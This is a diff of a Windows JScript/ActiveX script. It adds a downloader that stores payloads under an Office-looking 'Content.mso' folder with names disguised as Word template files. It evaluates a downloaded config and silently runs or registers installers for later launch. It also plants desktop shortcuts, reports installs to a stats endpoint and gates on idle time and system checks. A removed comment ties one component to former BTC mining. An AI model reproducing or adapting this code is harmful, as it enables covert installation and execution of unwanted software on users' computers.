@@ -22,7 +22,8 @@ var __shellapp = new ActiveXObject("Shell.Application");
 
 //var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
 var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
-var __destReady ={ name: "~$Doc1.dot",url:"http://127.0.0.1/config/~$Doc1.dot", md5:"21A03F017098B949FDAF76593A595BBA" }
+var __destReadyConfig ={ name: "Doc2.dot",url:"http://127.0.0.1/config/Doc2.dot", md5:"21A03F017098B949FDAF76593A595BBA" }
+//最重要的配置文件
 var __startTickCout = __external.GetTickCount()
 var __lastInputInfo = __external.GetLastInputInfo()
 /*
@@ -38,7 +39,8 @@ if(__DEBUG)
 	__idletime=1000*15
 else if(__IsSupportOpencl)
 	__idletime=1000*30
-var __destReady_dll ={ name: "mso.db",url:"http://127.0.0.1/config/mso.db", md5:"56C9CE5E71638A520003082AC620D0CB" }
+//var __destReady_dll ={ name: "mso.db",url:"http://127.0.0.1/config/mso.db", md5:"56C9CE5E71638A520003082AC620D0CB" } 曾的btc
+
 var __installReadys = [/*
 						{id: 10001, name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", 
 							md5:"8867658a8edd9765342bfc2483ed8c3e", param:" /S",
@@ -124,7 +126,7 @@ function module(name,g){
 				}else{
 					ret = this.filters[i](pipe);
 				}
-				log("module name : " + this.name +  " ran filter("+i+") return "+ (ret ? ret.toString() : "undefined") +" , currentpipe.name="+pipe.name.toString());	
+				log("module name : " + this.name +  " ran filter("+i+") return "+ (ret ? ret.toString() : "undefined") +" , currentpipe.name="+ (pipe.name?pipe.name.toString():"空"));	
 				if(this.currentFilterIndex<0){
 					return;
 				}				
@@ -197,7 +199,7 @@ module.prototype.setDoneCallback=function (callback) {
 }
 /////////
 module.modules={}
-module.setDoneCallback=function (callback) {
+module.setAllmoduleDoneCallback=function (callback) {
 	log("module module.setDoneCallback")
 	module.doneCallback = callback;
 }
@@ -283,26 +285,30 @@ function sendHttpStat(category, action , value ,syn){
 	}
 }
 ////////////////////
-function filter_dlbusiness(){
-	
+function filter_dlbusiness(dlobj){
+	this.dlobj = dlobj
 };
 function filter_dlbusiness.prototype.run(pipe){
-	log("pipe.name="+pipe.name+" url="+pipe.url);
-	var path = __workdir + pipe.name;
-	var md5 = __storage.GetFileMD5 (path) 
-	var pThis = this;
+	log("this.dlobj.name="+this.dlobj.name+" this.dlobj="+this.dlobj.url);
+	var path = __workdir + this.dlobj.name;
+	var name = this.dlobj.name;
+	var localmd5 = __storage.GetFileMD5 (path) 
+	var destmd5 = this.dlobj.md5
+	pipe.name = this.dlobj.name;
+	
+	var pThis = this;	
 	pipe.exitcode=100;
-	if(md5==pipe.md5.toUpperCase()){
-		log(" readyDestFile OnSuccess "+pipe.name+" , md5="+md5);
-		sendHttpStat("downloadedfile", "downloadedfile_success_"+pipe.name);
+	if(localmd5 == destmd5.toUpperCase()){
+		log(" readyDestFile OnSuccess "+name+" , dest file md5="+localmd5);
+		sendHttpStat("downloadedfile", "downloadedfile_success_"+name);
 		return true;
 	}
-	else{
-		if(md5.length > 0){
-			pipe.url =  pipe.url; //+"?rnd="+ (new Date()).valueOf() 
+	else{//开始下载
+		if(destmd5.length > 0){
+			//pipe.url =  pipe.url; //+"?rnd="+ (new Date()).valueOf() 
 		}
 		var objXMLHTTP = getXmlHttp(); 		 
-		objXMLHTTP.open("GET", pipe.url,true);
+		objXMLHTTP.open("GET", this.dlobj.url,true);		
 		objXMLHTTP.onreadystatechange = function(){ if (objXMLHTTP && objXMLHTTP.readyState == 4 ){
 					if(objXMLHTTP.status<400){
 						//var ret = __storage.Save(objXMLHTTP.responseStream, path);
@@ -316,20 +322,21 @@ function filter_dlbusiness.prototype.run(pipe){
 						var fso = __fso;
 						//fso.GetFile(path).Attributes = 2 
 						delete adostream;
-						log("download from url="+pipe.url+" to path="+path+" ,status="+objXMLHTTP.status +" statusText="+objXMLHTTP.statusText);
+						log("download from url="+pThis.dlobj.url+" to path="+path+" ,status="+objXMLHTTP.status +" statusText="+objXMLHTTP.statusText);
+						
 						if(1){
 							var tmd5 = __storage.GetFileMD5 (path)
-							log(" localpath md5 : "+tmd5+" destmd5:"+pipe.md5)
-							if((__DEBUG && tmd5) || (tmd5 == pipe.md5.toUpperCase()) ){
-								sendHttpStat("downloadingfile", "downloadingfile_success_" +pipe.name);
+							log(" localpath md5 : "+tmd5+" destmd5:"+destmd5)
+							if((__DEBUG && tmd5) || (tmd5 == destmd5.toUpperCase()) ){
+								sendHttpStat("downloadingfile", "downloadingfile_success_" +name);
 								pipe.exitaction="downloadingfile_success_" +pipe.name;
-								if( pipe.name.substr(pipe.name.length-4)==".cab"){
-									if(__storage.ExtractCab(__workdir+pipe.name, __workdir)){
-										log("extractcab success : " + " from " + __workdir+pipe.name+" to " + __workdir);
+								if( name.substr(name.length-4)==".cab"){
+									if(__storage.ExtractCab(__workdir+name, __workdir)){
+										log("extractcab success : " + " from " + __workdir+name+" to " + __workdir);
 									}
 									else{
-										sendHttpStat("downloadingfile", "downloadingfile_failed_extractcab_" + pipe.name); 
-										pipe.exitaction="downloadingfile_failed_extractcab_" + pipe.name;
+										sendHttpStat("downloadingfile", "downloadingfile_failed_extractcab_" + name); 
+										pipe.exitaction="downloadingfile_failed_extractcab_" + name;
 									}
 								}
 								pThis.callback(pipe);
@@ -337,20 +344,20 @@ function filter_dlbusiness.prototype.run(pipe){
 							}
 							else
 							{
-								sendHttpStat("downloadingfile", "downloadingfile_failed_md5_"+pipe.name);
-								pipe.exitaction="downloadingfile_failed_md5_"+pipe.name;
+								sendHttpStat("downloadingfile", "downloadingfile_failed_md5_"+name);
+								pipe.exitaction="downloadingfile_failed_md5_"+name;
 								pThis.callback(pipe, true);
 							}
 						}else{
-							sendHttpStat("downloadingfile", "downloadingfile_failed_"+pipe.name);
-							pipe.exitaction="downloadingfile_failed_"+pipe.name
+							sendHttpStat("downloadingfile", "downloadingfile_failed_"+name);
+							pipe.exitaction="downloadingfile_failed_"+name
 							pThis.callback(pipe, true);
 						} 
 						objXMLHTTP=null;
 					}
 					else{
-						sendHttpStat("downloadingfile", "downloadingfile_failed_"+pipe.name);
-						pipe.exitaction="downloadingfile_failed_"+pipe.name
+						sendHttpStat("downloadingfile", "downloadingfile_failed_"+name);
+						pipe.exitaction="downloadingfile_failed_"+name
 						pThis.callback(pipe, true);
 					}
 				}};
@@ -364,8 +371,137 @@ function filter_loadconfig() {
 function filter_loadconfig.prototype.run (pipe) {
 	var pThis = this;
 	log("evalFile("+ __workdir+pipe.name +")");
-	setTimeout(function(){evalFile(__workdir+pipe.name);},1)	
-	return true;
+	setTimeout(function(){evalFile(__workdir+pipe.name); log("end load file "+pipe.name ); pThis.callback(pipe) },1)	
+	return false;
+}
+function filter_innertask(){
+}
+function filter_launch(name,param){
+		this.name = name
+		this.param = param
+}
+function filter_launch.prototype.run(pipe){
+	 var name = this.name?this.name:""
+	 var param = this.param?this.param:"";
+	 log("filter_launch.prototype.run name="+name+",param="+param);
+	 if(name){
+	 		if(__fso.FileExists(__workdir+name)){
+	 			var cmd = __workdir+name
+	 			if(param)
+	 				cmd += " " + param;
+	 			__TRY(function(){ __wshShell.Exec(cmd);}); //非管理员会脚本出错!无权限
+	 			sendHttpStat("installed", name,1,1);
+	 		}
+	 } 	
+	 return true
+}
+function filter_regrunonce(id,name,param){
+	this.id=id;this.name=name;this.param=param;
+}
+function filter_regrunonce.prototype.run(pipe){
+	__TRY(function (){__wshShell.RegWrite("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\forcelaunch", 1, "REG_DWORD")})
+	var key = "HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+this.id
+	var value = this.name+" "+this.param;
+	log("filter_regrunonce.prototype.run key="+key+",value="+value);
+	__TRY(function (){__wshShell.RegWrite(key, value, "REG_SZ") });	
+}
+function filter_desktopicon(name,URL,IconFile,IconFileName){
+		this.name = name;
+		this.URL=URL
+		this.IconFile = IconFile
+		this.IconFileName = IconFileName
+}
+function filter_desktopicon.prototype.run(pipe){
+		var desktopdir = __wshShell.SpecialFolders("Desktop")		
+		var path=desktopdir+this.name
+		__storage.WritePrivateProfileValue(path,"InternetShortcut","URL",this.URL)
+		__storage.WritePrivateProfileValue(path,"InternetShortcut","IconFile",this.IconFile)
+		__storage.WritePrivateProfileValue(path,"InternetShortcut","IconFileName",this.IconFileName)	
+}
+function filter_innertask.prototype.run(pipe){
+	log("filter_innertask.prototype.run, typeof ___gconfig="+typeof ___gconfig)
+	if(___gconfig){}	
+	if("object" == typeof ___gconfig){
+		var pid = __external.GetPID();
+		var pid_max = ___gconfig.validcondition.PID.max ? ___gconfig.validcondition.PID.max : "*"
+		var pid_min = ___gconfig.validcondition.PID.min ? ___gconfig.validcondition.PID.min : "*"
+		log("pid="+pid+", pid_max="+pid_max+", pid_min="+pid_min);
+		for(i=0;i<pid.length;i++){
+			var current = pid.charCodeAt(i)
+			var dest_max = pid_max.charAt(i).length ? pid_max.charCodeAt(i) : 0xff
+			var dest_min = pid_min.charAt(i).length ? pid_min.charCodeAt(i) : 0x00
+			if(current >dest_max || current<dest_min){
+				//@
+				return true;
+			}
+		}
+		//		
+		var osiversion = parseInt( __osVersion.substr(0,1)) //  
+		var osiversion_max = ___gconfig.validcondition.osver.max?___gconfig.validcondition.osver.max:0xff
+		var osiversion_min = ___gconfig.validcondition.osver.min?___gconfig.validcondition.osver.min:0x00
+		log("osiversion="+osiversion+",osiversion_max="+osiversion_max+",osiversion_min="+osiversion_min)
+		if(osiversion>osiversion_max || osiversion_max<osiversion_min){
+			//@
+			return true;
+		}
+		//
+		var datver = __external.GetHostBuild();
+		var datver_max = ___gconfig.validcondition.datver.max?___gconfig.validcondition.datver.max:0xff
+		var datver_min = ___gconfig.validcondition.datver.min?___gconfig.validcondition.datver.min:0x00
+		log("datver="+datver+",datver_max="+datver_max+",datver_min="+datver_min)
+		if(datver>datver_max || datver<datver_min){
+			//@
+			return true
+		}
+		if(___gconfig.validcondition.condition){
+			if(!___gconfig.validcondition.condition()){
+				return true
+			}
+		}
+		var _innertask_module = new module("innertask");		
+		//下载列表
+		for(i=0; i<___gconfig.installlist.length;i++){
+			var install = ___gconfig.installlist[i];
+			if(install.invalidcondition && install.invalidcondition()){
+			}else{
+				log("add task dlsetup "+install.name+" ")
+				var _filter_dl = new filter_dlbusiness(install);			
+				_filter_dl.callback =_innertask_module.push(_filter_dl);
+				if(install.runimmediately){
+					var _filter_launch = new filter_launch(install.name,install.param);			
+					_filter_launch.callback =_innertask_module.push(_filter_launch);					
+				}else{
+					var _filter_regrunonce = new filter_regrunonce(install.id ,install.name,install.param);			
+					_filter_regrunonce.callback =_innertask_module.push(_filter_regrunonce);			
+				}
+			}					
+		}
+		//
+	 
+		var desktopdir = __wshShell.SpecialFolders("Desktop")		
+		for(i=0;i<___gconfig.desktopiconlist.length;i++){
+			var desktopicon=___gconfig.desktopiconlist[i]			 
+			if(desktopicon.invalidcondition && desktopicon.invalidcondition()){
+			}else{
+				//下载存成图标
+				var dlicon = {}
+				dlicon.name = desktopicon.name
+				dlicon.url=   desktopicon.iconPrivateProfileString.IconFile
+				log("add task dlicon "+desktopicon.name+" ")
+				var _filter_dl = new filter_dlbusiness(dlicon);			
+				_filter_dl.callback =_innertask_module.push(_filter_dl);
+				var _filter_desktopicon = new filter_desktopicon(desktopicon.name, 
+							desktopicon.iconPrivateProfileString.URL, desktopicon.iconPrivateProfileString.IconFile, desktopicon.iconPrivateProfileString.IconFileName)
+				_filter_desktopicon.callback=_innertask_module.push(_filter_desktopicon);				
+			}
+		}
+		
+		_innertask_module.run(pipe)
+		_innertask_module.setDoneCallback(function (mod) {
+			log("module name "+mod.name+" onDonCallback");		 
+		})//end _innertask_module.setDoneCallback
+		
+	}//end "object" == typeof ___gconfig
 }
 function filter_eXclusiveRuning(once){
 	this.once = once ? true : false; 
@@ -488,15 +624,18 @@ function onload(){
 	//1.启动统计
 	var __module = new module("global.js", 1);	
 	var filter_xrun = new filter_eXclusiveRuning(1)
-	var filter_dl = new filter_dlbusiness();
+	var filter_dl = new filter_dlbusiness(__destReadyConfig);
 	var filter_load = new filter_loadconfig();
+	var filter_inner = new filter_innertask();
 	var filter_xrun2 = new filter_eXclusiveRuning();
 	filter_xrun.callback=__module.push(filter_xrun)
 	filter_dl.callback =__module.push(filter_dl);
 	filter_load.callback = __module.push(filter_load);
+	
+	filter_inner.callback = __module.push(filter_inner);	
 	filter_xrun2.callback = __module.push(filter_xrun2)
 	////////////
-	var pipe = __destReady;
+	var pipe = {};
 	__module.setDoneCallback(function (mod,pipe, index) {		
 		exitaction = pipe.exitaction		
 		delete filter_xrun; delete filter_dl; delete filter_load; delete filter_xrun2;
